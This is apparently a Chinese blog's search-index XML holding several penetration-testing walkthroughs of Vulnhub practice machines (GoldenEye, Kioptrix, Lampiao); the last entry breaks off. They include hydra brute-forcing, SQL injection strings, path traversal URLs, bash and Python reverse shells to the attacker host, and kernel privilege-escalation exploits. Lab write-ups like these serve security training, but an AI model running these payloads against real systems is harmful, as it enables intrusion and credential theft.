<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>GoldenEye-v1</title>
    <url>/2022/01/03/GoldenEye-v1/</url>
    <content><![CDATA[<p><strong>靶机:192.168.12.132</strong><br><strong>kali:192.168.12.128</strong></p>
<h2 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h2><p><code>nmap -A -p- 192.168.12.132</code><br><img src="https://img-blog.csdnimg.cn/16683e8d03784c57a861efd9b53ced77.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>查看80端口</strong><br><strong>web目录：/sev-home</strong><br><img src="https://img-blog.csdnimg.cn/7056d11cee7e402d9c0766f863656536.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>访问发现需要用户名和密码</strong><br><img src="https://img-blog.csdnimg.cn/d2b33bbde6334f1a92234e086171f53a.png" alt="请添加图片描述"><br><strong>查看源代码</strong><br><strong>terminal.js</strong><br><img src="https://img-blog.csdnimg.cn/2918af84788748f99f9e1e6a945c7cff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>访问terminal.js文件</strong><br><strong>一串unicode编码</strong><br><strong>Boris的password</strong><br><img src="https://img-blog.csdnimg.cn/d40bb4d7cf5f47c7b17e72a486d87bf2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><img src="https://img-blog.csdnimg.cn/dc7ed3d0b6db49a3afe87ba7834293c6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>得到：用户名/密码=<strong>boris/InvincibleHack3r</strong><br><strong>成功登陆</strong><br><img src="https://img-blog.csdnimg.cn/d1c206a2db344cfc8e58e2ccf442e12f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>查看源代码发现两个用户名</strong><br><strong>Natalya Boris</strong></p>
<p><img src="https://img-blog.csdnimg.cn/52c32d0437364270980e2ad7d35ce965.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>爆破密码</strong><br><code>hydra -l Boris -P /usr/share/wordlists/fasttrack.txt 192.168.12.132 -s 55007 pop3</code><br><img src="https://img-blog.csdnimg.cn/d89b48c65f374141a7c95ecd0cdfb6f5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><code>hydra -l natalya -P /usr/share/wordlists/fasttrack.txt 192.168.12.132 -s 55007 pop3</code><br><img src="https://img-blog.csdnimg.cn/975bfd8462b546688c28a8034e96404a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>用户名：Boris<br>密码：secret1!</strong><br><strong>用户名：natalya<br>密码：bird</strong></p>
<p><a href="https://www.cnblogs.com/caodneg7/p/10430734.html">pop3协议命令</a></p>
<p><strong>Boris用户</strong><br><code>nc 192.168.12.132 55007</code><br><code>user Boris</code><br><code>pass secret1!</code><br><code>list</code><br><code>top 1</code><br><code>retr 1</code></p>
<p><strong>natalya用户</strong><br><strong>同上操作登陆</strong><br><code>retr 2</code> <strong>第二个邮件发现用户名和密码</strong><br><strong>用户名：xenia<br>密码：RCP90rulez!</strong></p>
<p><strong>提示我们修改hosts文件访问severnaya-station.com</strong><br><img src="https://img-blog.csdnimg.cn/4f0d49a1e9604f65b1f56c7020b9bac5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><code>gedit /etc/hosts</code>  <strong>修改hosts文件</strong><br><img src="https://img-blog.csdnimg.cn/7883a7d502f244d8af1b2d2909998e46.png" alt="请添加图片描述"><br><strong>访问后点击login</strong><br><img src="https://img-blog.csdnimg.cn/6fd655dd9b7f4a57863eb3808fae05ed.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><strong>成功登陆xenia用户</strong><br><strong>发现还有个doak用户</strong><br><img src="https://img-blog.csdnimg.cn/d712d6899e1d49b7b86c5154453ed895.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>再次爆破</strong><br><code>hydra -l doak -P /usr/share/wordlists/fasttrack.txt 192.168.12.132 -s 55007 pop3</code><br><img src="https://img-blog.csdnimg.cn/03f7080b802945729dd13000b9be0178.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><code>nc 192.168.12.132 55007</code> <strong>同上登陆doak用户</strong><br><code>retr 1</code><br>读取第一个邮件发现<br><strong>用户：dr_doak<br>密码：4England!</strong></p>
<p><img src="https://img-blog.csdnimg.cn/e5184948acf64986aae0ee951f715762.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>登陆dr_doak用户发现txt文件</strong><br><img src="https://img-blog.csdnimg.cn/d8f5ca62b4e2405891b901592bba72ca.png" alt="请添加图片描述"><br><strong>敏感目录：/dir007key/for-007.jpg</strong><br><img src="https://img-blog.csdnimg.cn/a3745195658a4618be25c89fc5d22c8b.png" alt="请添加图片描述"><br><strong>一串base64</strong><br><img src="https://img-blog.csdnimg.cn/cb51f660add547a18cc7a9a05f99c538.png" alt="请添加图片描述"><br><img src="https://img-blog.csdnimg.cn/3a427efd59f9482ba09e9f4a07daaf53.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_17,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>试下发现是admin的密码</strong><br><strong>用户：admin<br>密码：xWinter1995x!</strong></p>
<p><strong>登陆admin用户</strong></p>
<h2 id="二、Getshell-moodle"><a href="#二、Getshell-moodle" class="headerlink" title="二、Getshell(moodle)"></a>二、Getshell(moodle)</h2><p><strong>我的是msf6<br>旧版本的应该可以msf直接弹shell(我没试)</strong><br><img src="https://img-blog.csdnimg.cn/a5c0352a90f543fdb82e8c328126397b.png" alt="请添加图片描述"><br><strong>修改拼写引擎</strong><br><img src="https://img-blog.csdnimg.cn/ea29b5b4e8fc46e1aed93ffa524431d6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.12.128&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code>  <strong>–弹shell的payload</strong><br><img src="https://img-blog.csdnimg.cn/93a733a5d3b34ec9ad5d168b4d74f1ee.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><code>nc -lvp 4444</code> <strong>监听4444端口</strong><br><strong>点击拼写检查</strong><br><img src="https://img-blog.csdnimg.cn/52c65384162948c8b67561968db4308d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><strong>成功弹shell</strong><br><img src="https://img-blog.csdnimg.cn/48c2f5c67c334c32b54834e1d0c0e8bb.png" alt="请添加图片描述"></p>
<h2 id="三、提权-linux-ubuntu-3-13-0"><a href="#三、提权-linux-ubuntu-3-13-0" class="headerlink" title="三、提权(linux ubuntu 3.13.0)"></a>三、提权(linux ubuntu 3.13.0)</h2><p><code>uname -a</code> <strong>查看内核版本</strong><br><img src="https://img-blog.csdnimg.cn/e7f05ddf942b4b3086c9db6c1c9470a7.png" alt="请添加图片描述"><code>searchsploit linux ubuntu 3.13.0</code> <strong>查找有无可利用漏洞</strong></p>
<p><img src="https://img-blog.csdnimg.cn/ca1d9448237e420aa633aa11d329d78b.png" alt="请添加图片描述"><code>searchsploit -p 37292.c</code> <strong>查看路径</strong><br><img src="https://img-blog.csdnimg.cn/151a145584ce46b08b8f5fd2cf5340de.png" alt="请添加图片描述"><br><strong>靶机没有gcc 改为cc</strong><br><img src="https://img-blog.csdnimg.cn/632aed68f9f94b6ab83a1606a6016f19.png" alt="请添加图片描述"><br><code>python -m SimpleHTTPServer 8000</code><br><code>wget 192.168.12.128:8000/37292.c</code><br><code>gcc 37292.c -o exp</code> <strong>编译</strong><br><code>./exp</code> <strong>运行即可</strong><br><img src="https://img-blog.csdnimg.cn/1cc4209c381d4d11824a5a25e827a1b5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>成功root</strong></p>
]]></content>
      <categories>
        <category>Vulnhub系列</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Kioptix Level 2</title>
    <url>/2021/12/05/Kioptrix-Level-2/</url>
    <content><![CDATA[<p><strong>靶机: 192.168.249.130<br>kali: 192.168.249.129</strong></p>
<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>arp-scan -l</code><br><img src="/2021/12/05/Kioptrix-Level-2/1.png"></p>
<p><code>nmap -sV 192.168.249.130</code>—查看开放端口</p>
<p><img src="/2021/12/05/Kioptrix-Level-2/2.png"></p>
<p>—-<strong>访问下80端口</strong>—-<br><img src="/2021/12/05/Kioptrix-Level-2/3.png"></p>
<p>发现是个登录框先试试万能密码</p>
<p><strong>username:</strong><code>admin&#39; or 1=1#</code><br><strong>password:</strong><code>123(任意密码)</code></p>
<p><strong>发现可以登陆，即存在sql注入</strong></p>
<p><img src="/2021/12/05/Kioptrix-Level-2/4.png"></p>
<h4 id="二、0x00漏洞利用-sql注入"><a href="#二、0x00漏洞利用-sql注入" class="headerlink" title="二、0x00漏洞利用(sql注入)"></a>二、0x00漏洞利用(sql注入)</h4><p><strong>sqlmap跑一下数据</strong></p>
<p><em><em>登陆框抓包,因为sql注入在username处，在username处标记</em>(减少测试时间),然后将数据包复制到1.txt中,再用sqlmap跑</em>*</p>
<p><code>sqlmap -r 1 -level 3 -risk 2</code> –<br><img src="/2021/12/05/Kioptrix-Level-2/7.png"></p>
<p><font color="red"><strong>sql注入盲注</strong></font><br><code>sqlmap -r 1 --dbs --level 4 --risk 3 -D &quot;webapp&quot; -T &#39;users&#39; -C &#39;id,password,username&#39; --dump</code>  –<strong>爆出用户名为admin，密码为5afac8d85f</strong></p>
<p><img src="/2021/12/05/Kioptrix-Level-2/11.png"></p>
<p><font color="red"><strong>成功登录</strong></font></p>
<h4 id="二、0x01漏洞利用-rce-amp"><a href="#二、0x01漏洞利用-rce-amp" class="headerlink" title="二、0x01漏洞利用(rce&amp;)"></a>二、0x01漏洞利用(rce&amp;)</h4><p><strong>进入后PING框，尝试命令执行</strong><br><img src="/2021/12/05/Kioptrix-Level-2/8.png"><br>发现可以命令执行，但当前为apache权限</p>
<p><img src="/2021/12/05/Kioptrix-Level-2/9.png"></p>
<p><code>1&amp; bash -i &gt;&amp; /dev/tcp/192.168.249.132/4444 0&gt;&amp;1</code> -<strong>先弹shell到本地，此时为apache权限需要提权</strong></p>
<p><img src="/2021/12/05/Kioptrix-Level-2/10.png"></p>
<p><code>lsb_release -a</code>–<strong>查看内核</strong></p>
<p><img src="/2021/12/05/Kioptrix-Level-2/12.png"></p>
<p><code>searchsploit CentOS  4.5</code>–<strong>查找有无可利用的漏洞</strong></p>
<p><img src="/2021/12/05/Kioptrix-Level-2/13.png"></p>
<p>9542.c没法wget,需要wget到kali机上，然后开启simpleHTTPserver<br><code>python -m SimpleHTTPServer 8000</code></p>
<p><code>wget http://192.168.249.132:8000/9542.c</code></p>
<p><strong>/var/www/html权限不够无法wget，先切换到tmp目录</strong></p>
<p><img src="/2021/12/05/Kioptrix-Level-2/14.png"></p>
<p><code>gcc -o 9542 9542.c</code>—<strong>编译运行即可</strong></p>
<p><img src="/2021/12/05/Kioptrix-Level-2/15.png"></p>
<p><strong>—成功root—-</strong></p>
]]></content>
      <categories>
        <category>Vulnhub系列</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Kioptrix Level 4</title>
    <url>/2021/12/09/Kioptrix-Level-4/</url>
    <content><![CDATA[<p><strong>靶机：192.168.249.133</strong><br><strong>kali:192.168.249.132</strong></p>
<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>nmap -sV 192.168.249.133</code> <strong>—查看开放端口</strong></p>
<p><img src="/2021/12/09/Kioptrix-Level-4/1.png"></p>
<p><strong>—查看下80端口—</strong></p>
<p><img src="/2021/12/09/Kioptrix-Level-4/2.png"></p>
<p><strong>—是个登录框可能猜测sql注入漏洞—</strong></p>
<p><strong>—在用户名和密码处*标记，sqlmap跑一下</strong></p>
<p><img src="/2021/12/09/Kioptrix-Level-4/3.png"></p>
<p><code>sqlmap -r 1.txt --level 3 -risk 2 --batch -D members -T members -C password,username --dump</code><strong>—爆出用户名john密码MyNameIsJohn</strong></p>
<p><img src="/2021/12/09/Kioptrix-Level-4/4.png"></p>
<p><code>ssh john@192.168.249.133</code><strong>—–得到账号密码,先尝试ssh连接下</strong></p>
<p><img src="/2021/12/09/Kioptrix-Level-4/5.png"></p>
<p><strong>—-可以连接但发现很多命令没法执行—</strong></p>
<h4 id="二、逃逸受限shell"><a href="#二、逃逸受限shell" class="headerlink" title="二、逃逸受限shell"></a>二、逃逸受限shell</h4><p><a href="https://www.lshack.cn/653/" title="逃逸linux各种shell执行命令">逃逸linux各种shell执行命令</a></p>
<p><code>echo os.system(&quot;/bin/bash&quot;)</code> <strong>–echo命令逃逸受限shell</strong><br><img src="/2021/12/09/Kioptrix-Level-4/6.png"></p>
<h4 id="三、权限提升-mysql-udf提权"><a href="#三、权限提升-mysql-udf提权" class="headerlink" title="三、权限提升(mysql udf提权)"></a>三、权限提升(mysql udf提权)</h4><p><code>uname -a</code> <strong>–先查看下内核</strong></p>
<p><img src="/2021/12/09/Kioptrix-Level-4/7.png"></p>
<p><strong>–显然可以脏牛提权,但没有gcc—</strong></p>
<p><code>cat /etc/passwd</code> –<strong>查看系统用户配置文件发现john和robert用户默认使用kshell</strong><br><img src="/2021/12/09/Kioptrix-Level-4/8.png"></p>
<p><code>ps -ef</code> <strong>-查看下进程</strong><br><img src="/2021/12/09/Kioptrix-Level-4/9.png"></p>
<p><strong>–发现mysql是root权限–</strong></p>
<p><code>mysql -u root</code>  <strong>–root无密码即可登录</strong></p>
<p><img src="/2021/12/09/Kioptrix-Level-4/10.png"></p>
<p><strong>–学到了<font color="red">mysql udf提权</font>—</strong></p>
<p><code>select * from func;</code> <strong>–发现有执行命令函数</strong><br><img src="/2021/12/09/Kioptrix-Level-4/11.png"></p>
<p><strong>—可以赋予john用户root权限</strong></p>
<p><code>select sys_exec(&#39;usermod -a -G admin john&#39;);</code> <strong>–赋予权限</strong></p>
<p><code>sudo su</code> <strong>–输入john密码即拥有root权限</strong></p>
<p><img src="/2021/12/09/Kioptrix-Level-4/12.png"></p>
]]></content>
      <categories>
        <category>Vulnhub系列</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Kioptix Level 3</title>
    <url>/2021/12/07/Kioptrix-Level-3/</url>
    <content><![CDATA[<p><strong>靶机：192.168.249.131<br>kali: 192.168.249.132</strong></p>
<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>nmap -sV 192.168.249.131</code> –<strong>开放80端口</strong><br><img src="/2021/12/07/Kioptrix-Level-3/1.png"></p>
<p><strong>访问下，发现是个</strong><br><font color="red"><strong>LotusCMS</strong></font></p>
<p><img src="/2021/12/07/Kioptrix-Level-3/2.png"></p>
<p><code>search LotusCMS</code>  —<strong>在msf中查找LotusCMS有关漏洞</strong><br><img src="/2021/12/07/Kioptrix-Level-3/3.png"></p>
<p><code>set URI /</code>–<strong>-这里需要把URL路径改为/</strong><br><img src="/2021/12/07/Kioptrix-Level-3/4.png"></p>
<p><code>run</code> —-<strong>貌似出问题了，无法shell 百度了说是什么中英文版本的问题–没有解决</strong></p>
<p><img src="/2021/12/07/Kioptrix-Level-3/5.png"></p>
<p><strong>最后百度了下LotusCMS的exp</strong></p>
<h4 id="二、0x00漏洞利用-LotusCMS漏洞"><a href="#二、0x00漏洞利用-LotusCMS漏洞" class="headerlink" title="二、0x00漏洞利用(LotusCMS漏洞)"></a>二、0x00漏洞利用(LotusCMS漏洞)</h4><p><code>git clone https://github.com/Hood3dRob1n/LotusCMS-Exploit</code></p>
<p><img src="/2021/12/07/Kioptrix-Level-3/6.png"></p>
<p><code>nc -lvp 7777</code><strong>先开启监听端口7777</strong></p>
<p><img src="/2021/12/07/Kioptrix-Level-3/7.png"></p>
<p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code><strong>成功弹到shell优化终端</strong><br><img src="/2021/12/07/Kioptrix-Level-3/8.png"><br><strong>发现权限不是root权限</strong><br><img src="/2021/12/07/Kioptrix-Level-3/9.png"></p>
<h4 id="三、0x01提权-脏牛提权"><a href="#三、0x01提权-脏牛提权" class="headerlink" title="三、0x01提权(脏牛提权)"></a>三、0x01提权(脏牛提权)</h4><p><code>uname -a</code>–<strong>查看内核(2.6.24-24)</strong></p>
<p><code>searchsploit privilege | grep linux | grep 2.6.2</code>  **–**<strong>查找有无可利用漏洞</strong></p>
<p><img src="/2021/12/07/Kioptrix-Level-3/10.png"></p>
<p>–<strong>先将40839.c先wget到本地后再wget到靶机上–</strong></p>
<p><code>cd /tmp</code>  <strong>先到靶机tmp目录</strong></p>
<p><code>wget http://192.168.249.132:8000/40839.c</code>  –这里使用的是<strong>SimpleHTTPServer</strong></p>
<p><code>gcc -pthread 40839.c -o 40839 -lcrypt</code><strong>–按照40839.c的注释进行编译</strong></p>
<p><code>./40839 123456</code><br><img src="/2021/12/07/Kioptrix-Level-3/11.png"></p>
<p><strong>–设置密码为123456</strong></p>
<p><img src="/2021/12/07/Kioptrix-Level-3/12.png"></p>
<p><code>ssh firefart@192.168.249.131</code> <strong>—SSH连接成功root权限</strong><br><img src="/2021/12/07/Kioptrix-Level-3/13.png"></p>
]]></content>
      <categories>
        <category>Vulnhub系列</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Kioptix Level 5</title>
    <url>/2021/12/12/Kioptrix-Level-5/</url>
    <content><![CDATA[<p><strong>靶机：192.168.249.134</strong><br><strong>kali:  192.168.249.132</strong></p>
<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>ufs:/dev/ada0p2</code>  —<strong>指定根分区启动系统 这样指定根分区启动成功</strong>    </p>
<p><img src="/2021/12/12/Kioptrix-Level-5/1.png"></p>
<p><strong>–靶机变为login才算打开—</strong></p>
<p><img src="/2021/12/12/Kioptrix-Level-5/2.png"></p>
<p><code>nmap -sV 192.168.249.134</code> <strong>—查看开放端口</strong></p>
<p><img src="/2021/12/12/Kioptrix-Level-5/3.png"></p>
<p><strong>—访问下80端口—</strong><br><strong>&lt;查看源代码&gt;</strong></p>
<p><img src="/2021/12/12/Kioptrix-Level-5/4.png"></p>
<p><strong>&lt;看到URL访问下&gt;</strong></p>
<p><img src="/2021/12/12/Kioptrix-Level-5/6.png"></p>
<p><strong>—搜下有无<font color="red">pChart 2.1.3的漏洞</font>—</strong></p>
<p><img src="/2021/12/12/Kioptrix-Level-5/5.png"></p>
<p><strong>&lt;貌似是个目录遍历漏洞和xss,看下exp怎么利用&gt;</strong></p>
<p><img src="/2021/12/12/Kioptrix-Level-5/7.png"><br><img src="/2021/12/12/Kioptrix-Level-5/8.png"></p>
<p>先玩玩XSS,刚开始以为是反射型<br>测试了下,发现是存储型,插几次,访问这个session.php就会弹几次窗.</p>
<h4 id="二、0x00漏洞利用-pChart-2-1-3目录遍历"><a href="#二、0x00漏洞利用-pChart-2-1-3目录遍历" class="headerlink" title="二、0x00漏洞利用(pChart 2.1.3目录遍历)"></a>二、0x00漏洞利用(pChart 2.1.3目录遍历)</h4><p><code>http://192.168.249.134/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</code>—<strong>读取/etc/passwd</strong></p>
<p><img src="/2021/12/12/Kioptrix-Level-5/18.png"></p>
<p>**—靶机操作系统用的<font color="red"><strong>FreeBSD 9.0.0</strong></font>—-<br><code>http://192.168.249.134/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf</code>—<strong>读取aoache2-httpd.conf信息</strong></p>
<p><img src="/2021/12/12/Kioptrix-Level-5/10.png"></p>
<p><strong>–我们正常访问8080端口显示forbidden需要修改Firefox的配置—</strong></p>
<p><img src="/2021/12/12/Kioptrix-Level-5/9.png"></p>
<p><strong>–修改后即可访问–</strong></p>
<p><img src="/2021/12/12/Kioptrix-Level-5/11.png"></p>
<h4 id="二、0x01漏洞利用-PhpTax-lt-0-8远程代码执行漏洞"><a href="#二、0x01漏洞利用-PhpTax-lt-0-8远程代码执行漏洞" class="headerlink" title="二、0x01漏洞利用(PhpTax &lt;=0.8远程代码执行漏洞)"></a>二、0x01漏洞利用(PhpTax &lt;=0.8远程代码执行漏洞)</h4><p><strong>查看exp并利用</strong></p>
<p><img src="/2021/12/12/Kioptrix-Level-5/12.png"></p>
<p>—蚁剑连接—</p>
<p><img src="/2021/12/12/Kioptrix-Level-5/13.png"></p>
<p><strong>—这里同样需要添加User-Agent头—</strong></p>
<p><img src="/2021/12/12/Kioptrix-Level-5/14.png"></p>
<p><strong>—成功连接—</strong></p>
<p><img src="/2021/12/12/Kioptrix-Level-5/15.png"></p>
<p><strong>–此时权限为www—</strong></p>
<p><img src="/2021/12/12/Kioptrix-Level-5/16.png"></p>
<h4 id="二、0x02提权-FreeBSD9-0提权"><a href="#二、0x02提权-FreeBSD9-0提权" class="headerlink" title="二、0x02提权(FreeBSD9.0提权)"></a>二、0x02提权(FreeBSD9.0提权)</h4><p><strong>–搜一下FreeBSD9.0有无利用漏洞—</strong></p>
<p><img src="/2021/12/12/Kioptrix-Level-5/19.png"></p>
<p><strong>—通过蚁剑上传—</strong><br><img src="/2021/12/12/Kioptrix-Level-5/20.png"></p>
<p><code>gcc 28718.c -o 28718</code><strong>–先编译</strong></p>
<p><code>aslistcmd</code></p>
<p><code>ascmd /bin/sh</code> <strong>—/bin/sh执行命令</strong></p>
<p><code>./28718</code>   <strong>–运行</strong></p>
<p><strong>—成功root权限—</strong></p>
<p><img src="/2021/12/12/Kioptrix-Level-5/21.png"></p>
]]></content>
      <categories>
        <category>Vulnhub系列</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Lampiao</title>
    <url>/2022/01/07/Lampiao/</url>
    <content><![CDATA[<p><strong>靶机：192.168.12.133<br>kali：192.168.12.128</strong></p>
<h2 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h2><p><code>nmap -p- -sV 192.168.12.133</code><br><img src="https://img-blog.csdnimg.cn/5b9ed48c25aa4470a1004e069d88fff8.png" alt="请添加图片描述"><strong>访问80端口<br>一串乱码(没找到有用的信息)</strong><br><strong>访问1898端口</strong><br>$\color{red}{Drupal-CMS}$<br><img src="https://img-blog.csdnimg.cn/19daf187ae4949ceaa7b3ab5c0923fc3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><code>http://192.168.12.133:1898/?q=node/2</code><br><strong>audio.m4a<br>qrc.png</strong><br><img src="https://img-blog.csdnimg.cn/f32c9b7df8974de6be73ff6f953f955b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><code>wget http://192.168.12.133:1898/audio.m4a</code><br><code>wget http://192.168.12.133:1898/qrc.png</code></p>
<p><strong>qrc.png:Try harder! muahuahua</strong><br><strong>audio.m4a:user tiago</strong><br><strong>用户名：tiago</strong></p>
<h2 id="二、0x01-Getshell-Drupal-Drupalgeddon-2-远程代码执行漏洞"><a href="#二、0x01-Getshell-Drupal-Drupalgeddon-2-远程代码执行漏洞" class="headerlink" title="二、0x01 Getshell(Drupal Drupalgeddon 2 远程代码执行漏洞)"></a>二、0x01 Getshell(Drupal Drupalgeddon 2 远程代码执行漏洞)</h2><p><img src="https://img-blog.csdnimg.cn/78ad2be6912441faa30acb80a3bbf79d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><code>use exploit/unix/webapp/drupal_drupalgeddon2</code><br><code>set rhosts 192.168.12.133</code><br><code>set rport 1898</code><br><code>exploit</code><br><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img src="https://img-blog.csdnimg.cn/2c2a36ee8e6a486898a35f67e3c877b7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"> </p>
<h2 id="二、0x02-社工ssh密码爆破"><a href="#二、0x02-社工ssh密码爆破" class="headerlink" title="二、0x02 社工ssh密码爆破"></a>二、0x02 社工ssh密码爆破</h2><p><strong>得到用户名tiago且开放ssh端口</strong><br><code>cewl http://192.168.12.133:1898/?q=node/1 -w pwd.txt</code> <strong>生成字典</strong><br><code>hydra -l tiago -P pwd.txt 192.168.12.133 ssh</code> <strong>爆破</strong><br><img src="https://img-blog.csdnimg.cn/f13f14f501a84c3ab2535bb2c556700c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><code>ssh tiago@192.168.12.133</code>  <strong>成功连接</strong><br><img src="https://img-blog.csdnimg.cn/18ff70f80ac242a5a5497d520434cf51.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>
<h2 id="三、脏牛提权"><a href="#三、脏牛提权" class="headerlink" title="三、脏牛提权"></a>三、<strong>脏牛提权</strong></h2><p><code>uname -a</code> <strong>查看内核版本</strong><br><img src="https://img-blog.csdnimg.cn/e008997c9ac54e6587f4c3c83028bc2c.png" alt="请添加图片描述"><br><img src="https://img-blog.csdnimg.cn/bc4977c4f22340d483bdcd8b3b5e6a90.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>下载到桌面</strong><br><code>python -m SimpleHTTPServer 8000</code><br><code>wget http://192.168.12.128:8000/%E6%A1%8C%E9%9D%A2/40847.cpp</code><br><img src="https://img-blog.csdnimg.cn/501a03a7395a40edb4ef16625e46bf7e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><code>head 40847.cpp</code> <strong>查看文件信息</strong><br><img src="https://img-blog.csdnimg.cn/3b7ea6d2bb7d4bdcb273129e700a8c47.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" 